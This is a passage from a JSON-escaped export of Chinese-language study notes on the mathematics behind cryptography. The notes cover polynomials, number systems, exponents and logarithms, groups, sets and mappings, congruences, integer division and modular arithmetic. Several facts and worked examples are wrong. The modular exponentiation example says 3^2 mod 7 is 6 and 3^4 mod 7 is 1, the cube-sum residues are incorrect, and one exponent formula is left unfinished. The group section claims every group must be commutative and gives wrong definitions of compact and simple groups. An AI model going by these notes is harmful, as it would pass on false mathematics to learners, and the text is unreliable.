(x-a) 的余数为 P(a)。证明如下：\n我们将 P(x) 可以表示为 (x-a)Q(x)+R，其中 R 为余数，同时满足 0 \\le \\operatorname{deg}(R) &lt; 1。又有P(a) = (a-a)Q(a) + R = R，因为 (a-a)=0。\n2. 因式定理\n如果 a 是多项式 P(x) 的一个根，即 P(a)=0，则 P(x) 可以表示为 (x-a)Q(x) 的形式。证明如下：\n根据余数定理 P(x) = (x-a)Q(x) + R，其中 R=P(a)，如果 P(a)=0，则 R=0。因此，P(x) = (x-a)Q(x)。\n3. 中间值定理\n中间值定理用于证明一个多项式在两个实数之间至少存在一个实根。具体地说，如果 P(x) 是一个次数为 n 的多项式，a&lt;b 且 P(a)P(b) &lt; 0，则对于一些 a &lt; r &lt; b，有 P(r)=0。\n证明如下：\n因为 P(a)P(b) &lt; 0，所以多项式 P(x) 在 [a,b] 上必定有一个实根 r。由于 a &lt; r &lt; b，所以 r 就是 [a,b] 中的中间值。\n四、应用\n多项式及其运算在实际中有广泛的应用，例如在物理学、科学工程中都有涉及。下面列举一些实际应用：\n\n物理学中，多项式被用来描述力和运动之间的关系。\n电子工程中，多项式被用来建立电路的传输和滤波特性。\n机器学习和数据挖掘中，多项式被用来拟合数据，训练和预测模型。\n\n五、总结\n多项式是数学中重要的概念，具有广泛的应用。本文主要介绍了多项式的定义、多项式运算以及多项式的重要定理，希望能够对读者理解多项式的基本知识和应用有所帮助。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_常见数":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_常见数","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_常见数.md","title":"代数_常见数","links":[],"tags":[],"content":"实数、复数、有理数和无理数详解\n实数、复数、有理数和无理数是数学中常见的数的概念。在这篇文章中，我们将详细解释这些概念，包括它们之间的关系和区别。\n1. 实数 (Real Numbers)\n实数是数学中最基本的数集，它包括所有在数轴上可以找到的点。实数可以分为有理数和无理数。下面我们将分别介绍这两类数。\n1.1 有理数 (Rational Numbers)\n有理数是可以表示为两个整数之比的数，即 a/b 的形式，其中 a 和 b 是整数，且 b ≠ 0。有理数包括以下几种类型的数：\n\n整数：例如 -3、0、1、2等\n分数：例如 1/2、2/3、-3/4等\n有限小数：例如 0.25、-0.5、1.75等\n无限循环小数：例如 0.333…、1.666…等\n\n1.2 无理数 (Irrational Numbers)\n无理数是不能表示为两个整数之比的实数，它们既不是有限小数，也不是无限循环小数。无理数的小数部分是无限不循环的。常见的无理数有：\n\n圆周率 π：约等于 3.14159…\n自然对数 e：约等于 2.71828…\n无理数的平方根：例如 √2、√3等\n\n2. 复数 (Complex Numbers)\n复数是一种扩展了实数范围的数，形式为 a + bi，其中 a 和 b 是实数，i 是虚数单位，满足 i^2 = -1。复数包括实数和虚数两部分：\n2.1 实部 (Real Part)\n复数 a + bi 的实部是 a，表示复数在实数轴上的位置。\n2.2 虚部 (Imaginary Part)\n复数 a + bi 的虚部是 bi，表示复数在虚数轴上的位置。\n2.3 复平面 (Complex Plane)\n复数可以在复平面中表示为一个点，实部表示横坐标，虚部表示纵坐标。复平面将实数轴和虚数轴垂直相交，使得实数和虚数都能在同一个平面内表示。\n3. 总结\n实数是数学中最基本的数集，可以分为有理数和无理数。有理数是可以表示为两个整数之比的数，包括整数、分数、有限小数和无限循环小数。无理数是不能表示为两个整数之比的实数，例如圆周率和自然对数。复数是扩展了实数范围的数，包括实部和虚部，可以在复平面上表示为一个点。在数学研究中，实数、复数、有理数和无理数在不同的领域都有广泛的应用，包括代数、几何、分析、数论等。\n4. 相关运算\n实数、复数、有理数和无理数之间的运算也有一定的规律。以下是一些基本的运算规则：\n4.1 实数运算\n实数之间可以进行加、减、乘、除等基本运算。这些运算遵循以下规律：\n\n交换律：a + b = b + a，a × b = b × a\n结合律：(a + b) + c = a + (b + c)，(a × b) × c = a × (b × c)\n分配律：a × (b + c) = a × b + a × c\n\n4.2 复数运算\n复数之间的运算遵循以下规律：\n\n加法：(a + bi) + (c + di) = (a + c) + (b + d)i\n减法：(a + bi) - (c + di) = (a - c) + (b - d)i\n乘法：(a + bi) × (c + di) = (ac - bd) + (ad + bc)i\n除法：(a + bi) ÷ (c + di) = [(ac + bd) ÷ (c^2 + d^2)] + [(bc - ad) ÷ (c^2 + d^2)]i\n\n4.3 有理数与无理数运算\n有理数和无理数之间的运算结果可能是有理数，也可能是无理数。例如：\n\n有理数加无理数：1 + √2 = 1 + √2（无理数）\n有理数减无理数：3 - π = 3 - π（无理数）\n有理数乘无理数：2 × e = 2e（无理数）\n有理数除无理数：6 ÷ √3 = 6 ÷ √3（无理数）\n\n5. 应用\n实数、复数、有理数和无理数在数学及其相关领域中有许多应用。例如，在代数中，复数可以用于求解高次方程；在分析中，实数和复数可以用于研究连续函数和微积分；在数论中，有理数和无理数的性质被用于研究整数和分数的性质等。\n总之，实数、复数、有理数和无理数是数学中的基本概念，对于理解更高级的数学概念和方法具有重要意义。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_指数对数":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_指数对数","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_指数对数.md","title":"代数_指数对数","links":[],"tags":[],"content":"详解四则运算、指数和对数运算\n1. 四则运算\n四则运算是数学中最基础的运算，包括加法、减法、乘法和除法，是我们在小学时就学习的基础知识。\n1.1 加法\n加法是将两个或多个数相加的运算。例如，2+3=5，其中2和3为加数，5为和。\n1.2 减法\n减法是将一个数从另一个数中减去的运算。例如，5-2=3，其中5为被减数，2为减数，3为差。\n1.3 乘法\n乘法是将两个或多个数相乘的运算。例如，2x3=6，其中2和3为因数，6为积。\n1.4 除法\n除法是将一个数分成相等的若干部分的运算。例如，6÷3=2，其中6为被除数，3为除数，2为商。\n2. 指数运算\n指数运算是数学中常见的一种运算，可以用来表示一个数被乘方的次数。例如，2的3次幂为2^3，表示为8。\n2.1 指数的定义\n指数的定义为：若a为非零实数，n为正整数，则a的n次幂为a相乘n次，即a^n = a × a × … × a（n个a），其中a为底数，n为幂。\n2.2 指数运算的基本性质\n指数运算具有以下基本性质：\n\na^m×a^n = a^{m+n}，即同底数幂相乘，幂相加。\n\\frac{a^m}{a^n} = a^{m-n}，即同底数幂相除，幂相减。\n(a^m)^n = a^{mn}，即幂的幂，底数不变，幂相乘。\na^0 = 1，（a ≠ 0），任何数的0次幂都等于1。\na^{-n} = \\frac{1}{a^n}，负指数的幂是分母为底数，分子为1的正指数幂。\na^{\\frac{1}{n}}，则a的n次幂的n次方根为a的\\frac{}{}\n\n2.3 指数运算的应用\n指数运算在很多领域都有广泛的应用。例如：\n\n金融领域中，利率的计算就是基于指数运算的复合利率计算。\n在物理学中，指数运算可以用来表示指数增长和衰减的过程。\n在计算机科学中，指数运算经常出现在算法的设计中，如快速幂算法等。\n\n3. 对数运算\n对数运算是指用一个数来表示另一个数在某个数学问题中的指数的运算，它是指数运算的逆运算。\n3.1 对数的定义\n设b&gt;0，且b\\neq1，a&gt;0，则称y=log_ba为以b为底a的对数。\n这个定义中，b称为对数的底数，a称为对数的真数，y称为对数。例如，log_24=x，则2的x次幂等于4.\n3.2 对数运算的基本性质\n对数运算也具有一些基本性质：\n\nlog_b(mn) = log_bm + log_bn，即对数的积等于对数分别相加。\nlog_b(\\frac{m}{n}) = log_bm - log_bn，即对数的商等于对数分别相减。\nlog_b(m^p) = plog_bm，即对数的幂等于幂对数乘以底数的对数。\nlog_b1 = 0，因为b的0次幂等于1。\nlog_bb = 1，因为b的1次幂等于b。\nlog_1b 不存在。\n\n3.3 对数运算的应用\n对数运算在很多领域中都有广泛的应用，例如：\n\n在声音和信号处理中，听觉上的响度和声音的分贝级别使用对数比率的概念。\n在化学中，pH值与酸碱性的浓度成比例，pH= -log_{10}[H^+]。\n在计算机科学中，对数运算经常使用在算法中，例如可排序算法和搜索算法。\n\n结论\n四则运算、指数和对数运算是数学中非常基础和重要的一些运算。它们在很多领域中都有广泛的应用，无论是在日常生活还是在学习和工作中都是必不可少的工具。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_群":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_群","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_群.md","title":"代数_群","links":[],"tags":[],"content":"详解群的定义、性质和分类\n1. 引言\n群（Group）是代数学中的一种数学结构，被广泛应用于各个数学领域和物理学中。它是数学中最具有抽象性的一个概念之一，概括了数学中许多重要的理论和方法，同时在数值模拟和编程领域中也具有重要的应用。本文将详细介绍群的定义、性质和分类，以帮助读者深入理解这一数学概念。\n2. 群的定义\n群是一个集合 G 和一个二元运算 * 具有一下4个性质的数学结构：\n\n封闭性：对于 a,b \\in G，a*b也在G中；\n结合律：对于 a,b,c \\in G，(a*b)*c=a*(b*c)；\n恒等元：存在一个元素 e \\in G 使得 \\forall a \\in G，a*e=e*a=a；\n逆元：对于群 G 中的任意元素 a，存在一个元素 a^{-1}，使得 a*a^{-1}=a^{-1}*a=e。\n\n凭直觉，这意味着群的任意两个元素都可以通过群运算相互转换，并且第四个性质要求群的每个元素都有一个可逆元素（也就是逆元素），使得对于每个元素 a，乘以它的逆元素等于单位元素 e。而群运算 * 必须满足封闭性和结合律，这是“运算”属性的基本的需求，另外也必须满足交换律。如果运算 * 满足交换律，则称群为“可交换群”或阿贝尔群。\n3. 群的性质\n3.1 单位元和逆元的唯一性\n任何群都必须具有唯一的单位元素，用 e 表示。如果一个群有两个不同的单位元素 e&#039; 和 e&#039;&#039;，那么由于 e&#039; 是群的一个单位元素，所以有 e&#039; * e&#039;&#039; = e&#039;&#039;；同样， e&#039;&#039; 也是一个单位元素，有 e&#039; * e&#039;&#039; = e&#039;。这样就得到 e&#039;&#039;=e&#039;，也就是说，群的单位元素必须惟一。\n群元素的逆元素也必须惟一。对于同一个群元素 a，必须存在唯一的元素 a^{-1}，满足 a * a^{-1} = a^{-1} * a = e。\n3.2 群的运算具有消去律\n如果一个群运算 * 具有消去律，即对于群 G 中的任两个元素 a 和 b，如果 a * c = b * c，那么 a = b（其中 c 是 G 的一个任意元素），则称群 (G, *) 具有消去律。一般而言，形如复数的群运算是没有消去律的，但像矩阵这种多维度的群，在有特定的限制条件下是可以具有消去律的。\n3.3 群的幂等性和逆幂等性\n对于群 (G, *) 中的任何元素 g，都有幂等性质：g * g = g^2，即群元素自乘的结果仍然是这个群的元素。此外，如果 a * b = e，那么 a 和 b 互为逆元素，即 a=b^{-1} 且 b=a^{-1}。这种反向操作的性质称为逆幂等性。\n3.4 群的左陪集和右陪集\n如果 H 是群 G 的一个子集，a \\in G，则 aH = \\{ah |  h \\in H\\} 称为 H 的左陪集，Ha = \\{ha |  h \\in H\\}称为 H 的右陪集。陪集具有下列性质：\n\n两个不同的左陪集是不想交的；\n两个不同的右陪集是不想交的；\n所有左陪集的并构成了 G，所有右陪集的并构成了 G；\n一个元素 g 在 H 的左陪集中当且仅当 a_1 * g = a_2，其中 a_1 属于 H。\n\n3.5 子群的定义\n设 (G, *) 是群，如果 H 是 G 的非空子集，而且 H 对 G 中定义的群运算 * 封闭，且在 H 中存在单位元素 e，那么称 H 是 G 的子群。\n4. 群的分类\n4.1 有限群与无限群\n群可以分为两类：有限群和无限群。如果群具有有限个元素，则称该群为有限群，否则称该群为无限群。\n4.2 压缩群与离散群\n压缩群和离散群是几何对象的数学描述。如果一个群具有连续的性质，像实数一样，那么它被称为压缩群。如果一个群是一个离散对象的群，如整数或布尔代数，那么称这个群为离散群。\n4.3 有限生成群\n有限生成群是指存在有限个元素，使它们的各种组合可以得到群中的所有元素。例如，整数加群就是一个有限生成群。\n4.4 简单群\n简单群是指任意非平凡子群都与整个群相等的群，即没有非平凡的正规子群。可以证明一个群是有限简单群当且仅当它不能表示成其他有限简单群的直积。\n4.5 循环群\n循环群是由一个元素通过重复作用群运算所生成的群，其中这个元素称为生成元。例如，模 n 的整数环中的循环群 C_n，就是由一个元素 a 作用群运算 + 所生成的群，满足 a, a + a, a + a + a, \\ldots, a + (n-1)a 是整数环的完整集合。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_集合关系映射":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_集合关系映射","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/代数基础/代数_集合关系映射.md","title":"代数_集合关系映射","links":[],"tags":[],"content":"集合、关系和映射\n1. 集合\n集合是数学中最基础的概念之一，是指由一些互不相同的元素组成的整体。例如，{1, 2, 3} 就是一个集合，其中1、2、3是集合的元素。\n1.1 集合的定义\n集合的定义为：一个集合是一些互不相同的数、元素或对象的集合体。一个元素要么属于一个集合，要么不属于一个集合。\n1.2 集合的运算\n集合有三种基本的运算：\n\n并集：包含两个或多个集合中的所有元素，重复的元素只被计算一次。例如，集合A={1, 2, 3}，集合B={3, 4, 5}，则它们的并集为A∪B={1, 2, 3, 4, 5}。\n交集：包含两个或多个集合中共有的元素。例如，集合A={1, 2, 3}，集合B={3, 4, 5}，则它们的交集为A∩B={3}。\n补集：包含一个集合中不属于另一个集合的元素。例如，集合A={1, 2, 3}，集合B={3, 4, 5}，则A的相对补集为A-B={1, 2}。\n\n1.3 集合的性质\n集合具有以下基本性质：\n\n任何集合都包含空集，即不包含任何元素的集合。\n如果两个集合包含的元素完全相同，则它们是相等的，即A=B。\n交换律：A∩B=B∩A。\n结合律：(A∩B)∩C=A∩(B∩C)和(A∪B)∪C=A∪(B∪C)。\n分配律：A∩(B∪C)=(A∩B)∪(A∩C)和A∪(B∩C)=(A∪B)∩(A∪C)。\n对于任何集合A，A∪A=A和A∩A=A。\n\n2. 关系\n关系用来描述两个或多个集合之间的联系，是数学中重要的概念。\n2.1 关系的定义\n关系是指一个集合中的元素与另一个集合中的元素之间的一种对应关系。例如，R是集合A与集合B之间的一个关系，可以表示为R(A,B)。\n2.2 关系的运算\n关系有三种基本的运算：\n\n复合关系：将两个关系作为输入，输出一个新的关系。\n逆关系：反转输入关系中的元素，输出一个新的关系。\n转换关系：改变关系的定义，输出一个新的关系。\n\n2.3 关系的性质\n关系具有以下基本性质：\n\n自反性：对于任何元素x，都有(x, x)∈R。\n对称性：如果(x, y)∈R，则(y, x)∈R。\n传递性：如果(x, y)∈R并且(y, z)∈R，则(x, z)∈R。\n反自反性：对于任何元素x，都有(x, x)∉R。\n反对称性：如果(x, y)∈R并且(y, x)∈R，则x=y。\n\n3. 映射\n映射是一种将一个对象与另一个对象联系起来的方式。在数学中，映射用来描述一个集合中的元素与另一个集合中的元素之间的一种对应关系。\n3.1 映射的定义\n映射是指一个集合中的元素与另一个集合中的元素之间的一种对应关系。其中，源集合中的元素称为定义域，目标集合中的元素称为值域，映射可以用一个函数来表示。\n3.2 映射的性质\n映射具有以下基本性质：\n\n反函数：如果f(x)=y，则f的反函数f-1(y)=x。\n满射：对于每一个y∈Y，都有一个x∈X，使得f(x)=y。\n单射：对于任意不同的x1、x2，有f(x1)≠f(x2)。\n双射：既满足满射，又满足单射。\n\n3.3 应用\n映射在很多领域中都有广泛的应用，例如：\n\n在计算机科学中，映射广泛应用于图形学，计算机视觉和人工智能等领域。\n在生物领域，映射用于描述基因之间的相互作用关系。\n在经济学中，映射被用来描述消费者需求弹性和产业投入产出关系等。\n\n结论\n集合、关系和映射是数学中非常基础和重要的概念，它们在很多领域中都有广泛的应用。对这些概念的深入理解，对于我们掌握数学的基础知识和高级概念都非常重要。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/密码学中的数学基础":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/密码学中的数学基础","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/密码学中的数学基础.md","title":"密码学中的数学基础","links":[],"tags":[],"content":"数论基础\n\n\n1. 整数和除法\n\n\n :  最基本的整数概念\n\n\n :  整数除法\n\n\n : 最大公约数（GCD）\n\n\n :  最小公倍数（LCM）\n\n\n2. 素数和素数分布\n\n\n :  素数的定义和性质\n\n\n素数筛法（如埃拉托斯特尼筛法）\n\n\n素数分布的理论和猜想（如素数定理）\n\n\n3. 模运算\n\n\n : 模运算的定义和性质\n\n\n :   逆元\n\n\n :   模运算的应用\n\n\n4. 同余\n\n\n :  同余的定义和性质\n\n\n :  同余的运算法则\n\n\n :  同余方程\n\n\n5. 费马小定理和欧拉定理\n\n\n :  费马小定理的陈述、证明和应用 （群的理论）\n\n\n :  欧拉定理的陈述、证明和应用\n\n\n6. 线性同余方程\n\n\n解线性同余方程的方法\n\n\n扩展欧几里得算法\n\n\n中国剩余定理\n\n\n7. 欧几里得算法\n\n\n欧几里得算法用于计算最大公约数\n\n\n扩展欧几里得算法用于求解线性丢番图方程\n\n\n8. Wilson定理和其他数论定理\n\n\nWilson定理及其应用\n\n\n孙子定理等其他数论定理\n\n\n9. 算术函数\n\n\n欧拉ϕ函数\n\n\n莫比乌斯函数\n\n\n其他数论函数的性质和应用\n\n\n10. 二次剩余和二次互素\n\n\n二次剩余的定义和性质\n\n\nLegendre符号和Jacobi符号\n\n\n解二次同余方程的方法\n\n\n11. 不定方程\n\n\n丢番图方程\n\n\n佩尔方程\n\n\n其他整数解的不定方程\n\n\n12. 连分数\n\n\n连分数的定义和性质\n\n\n连分数在数论中的应用，如求解最佳有理逼近\n\n\n13. 概率数论\n\n\n整数性质的概率分布\n\n\n随机整数的算术性质\n\n\n概率数论中的其他分布和性质\n\n\n14.数论的几何和代数方法\n\n椭圆曲线在数论中的应用\n代数数域\n代数几何方法在数论问题中的应用\n\n\n\n这是一个完整的数论学习大纲，涵盖了数论的主要内容。根据自己的兴趣和需求，您可以有选择地深入研究某些主题。对于密码学和计算机科学背景的学习者来说，同余、模运算、费马小定理、欧拉定理等主题尤为重要。\n代数基础\n\n1. 基本概念和运算\n\n  实数、复数、有理数和无理数\n  四则运算、指数和对数运算\n  集合、关系和映射\n\n\n2. 代数式和多项式\n  代数式的基本概念\n  多项式及其运算\n  因式分解\n  多项式的零点和根\n3. 线性代数\n向量空间和基底\n矩阵运算和线性方程组\n行列式和逆矩阵\n特征值和特征向量\n线性变换和相似矩阵\n奇异值分解和主成分分析\n4. 代数方程和代数方程组\n一元代数方程的解法\n高次代数方程的解法\n系数和根之间的关系\n代数方程组的解法\n线性方程组的解法和应用\n5. 群、环和域\n  群的定义、性质和分类\n拓扑群和李群\n环的定义、性质和分类\n  域的定义、性质和分类\n  有限域及其在密码学中的应用\n6. 抽象代数\n同态和同构\n正规子群和正规子环\n群表征和表示论\nGalois理论和代数扩张\n7. 代数几何\n仿射空间和射影空间\n代数曲线和椭圆曲线\n代数簇和概型\n奇点和奇点消解\n8. 数论和代数\n整数环和整数域\n代数数和代数数域\n理想和整环\n9.多元代数\n\n多元多项式\nGroebner基和多项式理想\n多元多项式的应用（如多元方程组求解）\n\n\n10. 向量空间的几何解释\n向量及其几何表示\n线性无关和线性相关\n子空间、基和维数\n正交性和正交基\n11. 二次型和Jordan标准形\n二次型的定义和性质\n二次型的规范形\nJordan标准形的定义和性质\n计算Jordan标准形的方法\n12. 模型论和一阶逻辑\n一阶逻辑的基本概念\n模型论的基本概念\nGödel不完备性定理\n\n这个大纲涵盖了代数的主要内容。学习代数时，您可以根据自己的兴趣和需求有选择地深入研究某些主题。对于密码学和计算机科学背景的学习者来说，线性代数、群、环和域以及有限域等主题尤为重要。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_同余":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_同余","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_同余.md","title":"数论_同余","links":[],"tags":[],"content":"同余基础概念\n同余是一个在数学中非常重要的概念。当两个数之间的差是另一个数的倍数时，我们称这两个数对于给定的模数模同余。因此，同余是模运算的基本概念之一。\n对于整数a，b和模数n，如果a-b能够整除n，则我们可以表示为a≡b(mod n)，读作“a与b在模n下同余”。其中“≡”表示同余的符号。\n同余有几种性质：\n\n自反性：a≡a(mod n)\n对称性：如果a≡b(mod n)，那么b≡a(mod n)\n传递性：如果a≡b(mod n)，b≡c(mod n)，那么a≡c(mod n)\n加法性：如果a≡b(mod n)，c≡d(mod n)，那么a+c≡b+d(mod n)\n减法性：如果a≡b(mod n)，c≡d(mod n)，那么a-c≡b-d(mod n)\n乘法性：如果a≡b(mod n)，c≡d(mod n)，那么a×c≡b×d(mod n)\n\n这些性质使同余成为数学中非常有用的工具，可以在很多数学问题中使用，例如解决线性同余方程和计算模数的倒数等。\n同余的应用\n同余的应用非常广泛，比如：\n\n在密码学中，同余被广泛用于公钥密码的生成。RSA算法就是一种利用同余的加密算法。\n在计算机科学中，同余被用于研究哈希函数和随机数生成器。大多数哈希函数都是利用同余的方式来计算指纹，并且同余的随机数生成器也广泛用于计算机科学中的模拟和仿真。\n在数学证明中，同余可以被用于构造等效的数学形式。例如，同余可以用于证明在一个单位圆中的所有平方数均为1模4同余的事实。\n\n同余的计算\n计算同余需要对模数的基本运算，例如加法、减法和乘法具有以下一个或多个性质：\n\n闭合性：对于所有a、b∈Z，a+bmod n∈Z，a-bmod n∈Z，a×b mod n ∈Z。\n归纳性：对于任何a∈Z，a+1 mod n=a mod n +1，a-1 mod n=a mod n-1。\n可逆性：对于所有a∈Z，存在一个数-b∈Z，使得a+b mod n=0。\n传递性：如果a mod n=b mod n，那么a±c mod n=b±c mod n，a×c mod n=b×c mod n。\n\n基于这些性质，我们可以进行同余的计算。下面是一些例子：\n同余计算1\n用同余来计算3^100 mod 7。\n因为3 mod 7 = 3，我们可以开始计算3^2 mod 7=2×3 mod 7=6。然后，我们可以继续计算3^4 mod 7 = 6² mod 7 = 1 mod 7。这随后就会导致我们得到3^8 mod 7 = 1² mod 7 = 1。因此，我们可以继续计算3^10 mod 7 = 3^8×3² mod 7 = 1×9 mod 7=2。最后，我们可以继续计算3^100 mod 7 = (3^10)^10 mod 7 = 2^10 mod 7 = 5。\n同余计算2\n我们可以使用同余来计算一个大数的立方和。例如：1^3+2^3+3^3+…+10^3 mod 7。\n第一步是计算1³、2³、3³等的余数。这些余数是1、1、6、1、1、6、1、1、6和5.  然后，我们可以将它们相加得到22。 那么：1^3+2^3+3^3+…+10^3 mod 7 = 22 mod 7 = 1。\n同余的验证\n同余也可以用于验证其他的计算。例如假设我们要计算：\n(a+b)² mod n = (a²+2ab+b²) mod n\n我们可以证明这个等式是正确的，通过使用同余：\n(a + b)² mod n\n= (a + b)(a + b) mod n  \n= [(a mod n) + (b mod n)] [(a mod n) + (b mod n)] mod n    \n= (a mod n)(a mod n) mod n + (a mod n)(b mod n) mod n + (b mod n)(a mod n) mod n + (b mod n)(b mod n) mod n    \n= (a² mod n) + (2ab mod n) + (b² mod n) mod n    \n= (a² + 2ab + b²) mod n\n\n这就证明了上述等式。\n同余方程\n同余方程是指形如**ax ≡ b (mod n)**这样的方程，其中a、b、n是整数，x是我们要求解的未知数。这种方程可以用来解决很多问题，例如计算模数的倒数、计算线性同余方程等问题。\n在同余方程中，我们会把模数n称为模数，系数a称为系数，方程右侧的b值称为余数。\n同余方程有很多种不同的类型和形式，例如简单同余方程、一次同余方程和多项式同余方程等\n简单同余方程\n简单同余方程是指形如x ≡ a (mod n)的方程，其中a和n都是整数，x是未知数。这种方程有一个很显然的解，即x = a + nk (k是整数)。我们可以通过这个公式来计算简单同余方程的所有解。\n下面步骤性的介绍如何计算简单同余方程：\n\n步骤1：找到任意一个x的解\n\n我们可以通过代入k=0、1、2…等方式来找到任意一个x的解。例如，x=a (mod n)有一个显然的解，即x=a+0n=a。\n\n步骤2：通过x的解计算所有解\n\n我们可以通过公式x=a+nk(k∈Z)求出所有满足条件的解，将n代入整数集合Z中，得到所有的解。\n例如，如果我们已经找到了一个解x=a，那么所有的解都可以表示成x=a+nk，其中k∈Z。另外，也可以表示成x≡a(mod n)，其中n是模数。\n注：在实际应用中，我们通常只关注简单同余方程的最小非负整数解，即0⇐x&lt;n之间的最小非负整数解。\n现在我们用一个例子来说明如何计算简单同余方程。\n计算x ≡ 4 (mod 7)的所有解。\n\n找到一个解\n\n我们可以代入k=0，求得一个解：x=4。\n\n计算所有解\n\n我们使用公式x=4+7k，其中k∈Z，得到所有的解。\nx=4+7×0=4\nx=4+7×1=11\nx=4+7×2=18\nx=4+7×3=25\n…\n这些方程的解可以表示成模数n下的等价类，即x≡4(mod 7)的解是0和7和14和21和…\n一次同余方程\n一次同余方程是指形如ax ≡ b (mod n)的方程，其中a、b、n都是整数，且a和n互质。这种方程的解可以用扩展欧几里得算法来求解。\n解决一次同余方程\n\n步骤1：确定a的逆元\n\n由于a与n互质，所以一定存在a的乘法逆元a’，满足a×a’≡1(mod n)。我们可以利用扩展欧几里得算法来寻找a’。\n\n步骤2：计算解x\n\n将两边乘以a’，得到x≡ba’ (mod n)。我们可以利用扩展欧几里得算法计算a’和b的乘法逆元，然后将其代入到方程中计算出x。\n\n步骤3：验证解x\n\n将求出的解x代入原方程，验证是否是正确的解。\n例子\n现在我们用一个例子来说明如何解决一次同余方程。\n计算2x ≡ 6 (mod 5)的解。\n\n确定a的逆元\n\n由于2与5互质，所以可以使用扩展欧几里得算法来求2的逆元，如下所示：\n5 = 2 × 2 + 1\n1 = 5 - 2 × 2\n\n因此，2的逆元为-2（mod 5），即2×(-2)≡1(mod 5)。\n\n\n计算解x\n\n将两边乘以a’，得到x≡ba’ (mod n)，所以x≡6×(-2) (mod 5)，即x≡3 (mod 5)。\n\n验证解x\n\n将求得的解x=3代入原方程，验证等式是否成立：\n2x ≡ 6 (mod 5)\n2×3 ≡ 6 (mod 5)\n6 ≡ 6 (mod 5)\n\n因此，x=3是原方程的一个解。\n总结\n同余是数学中的一个基本概念，广泛应用于各个领域。同余的应用非常广泛，比如在密码学、计算机科学、数学证明等领域有着重要的作用。同时，在计算同余时我们还需要遵循基本的同余性质，以此进行正确的计算和验证。"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_整数与除法":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_整数与除法","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_整数与除法.md","title":"数论_整数与除法","links":[],"tags":[],"content":"整数与除法是数学基础概念，这里是关于它们的详细解释：\n整数（Integers）\n整数是数学中最基本的概念之一，包括正整数、负整数和零。正整数是大于零的整数（如1，2，3…），负整数是小于零的整数（如-1，-2，-3…），零既不是正数也不是负数。\n整数具有以下性质：\n\n封闭性：整数的加法、减法和乘法运算结果仍为整数。\n结合律：对于任意整数a、b和c，(a + b) + c = a + (b + c) 且 (a * b) * c = a * (b * c)。\n交换律：对于任意整数a和b，a + b = b + a 且 a * b = b * a。\n分配律：对于任意整数a、b和c，a * (b + c) = a * b + a * c。\n存在加法和乘法单位元：存在整数0和1，使得对于任意整数a，a + 0 = a 且 a * 1 = a。\n存在加法逆元：对于任意整数a，存在整数-b，使得a + (-b) = 0。\n\n除法（Division）\n除法是数学中的一种基本运算，用来求一个数被另一个数整除的商和余数。对于任意两个整数a和b（b ≠ 0），我们可以将a除以b，得到商q和余数r，满足以下关系：\na = b * q + r\n\n其中0 ≤ r &lt; |b|。这里，q称为商，r称为余数。\n例如，当a = 17，b = 5时，我们可以得到：\n17 = 5 * 3 + 2\n\n所以，商q = 3，余数r = 2。\n除法有以下性质：\n\n唯一性：对于任意整数a和非零整数b，存在唯一的整数商q和余数r满足上述关系。\n除法算术：除法与加法和乘法有关，满足a = b * q + r这一关系。\n若a能被b整除（即余数为0），则我们称a是b的倍数，b是a的因数。\n\n注意：在整数范围内，除法不满足封闭性、结合律、交换律和分配律。例如，5除以2的商不是整数，所以整数除法不满足封闭性。\n最大公约数\n最大公约数（GCD）是指两个或多个整数共有约数中最大的一个，记为gcd(a,b)。其中，a和b是非零整数，且不同时为0。\n最大公约数的计算方法有很多种，其中辗转相除法是最常用的一种。具体步骤如下：\n\n如果a&lt;b，交换a和b的值。\n用a除以b，得到余数r。\n如果r=0，则gcd(a,b)=b；如果r≠0，则把b赋值给a，把r赋值给b，然后重复步骤2，直到r=0为止。\n\n最大公倍数\n最大公倍数（LCM）是指两个或多个整数公有倍数中最小的一个，记为lcm(a,b)。其中，a和b是非零整数。\n最大公倍数的计算方法有多种，常用的方法有因数分解法和公式法。具体方法如下：\n\n因数分解法：分别分解a和b的质因数，然后乘以各自的最高次幂，得到lcm(a,b)。\n例如，假设a=2^2×3^3×5，b=2×3×5^2，那么lcm(a,b)=2^2×3^3×5^2=1800。\n公式法：lcm(a,b)=a×b÷gcd(a,b)。\n"},"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_模运算":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_模运算","filePath":"blockchainguide/Public_Chain_Development/Cryptography/密码学中的数学/数论基础/数论_模运算.md","title":"数论_模运算","links":[],"tags":[],"content":"模运算的定义和性质\n模运算的定义\n模运算又称同余运算，用符号”≡“表示，它指的是两个数对于某个数的余数具有相同的性质。具体来说，如果a和b是整数，n是正整数，那么我们称a和b在模n下同余，如果a和b对n取余后余数相同，即(a mod n) = (b mod n)。\n形式化的表示为：\na ≡ b (mod n)\n上面的式子可以理解为：a和b是关于模数n的等价类，也可以表示为a = b + kn，其中k为整数。\n例如，12≡5 (mod 7)，因为12和5在模7下的余数相同，都是5。\n模运算的性质\n\n传递性：如果a≡b(mod 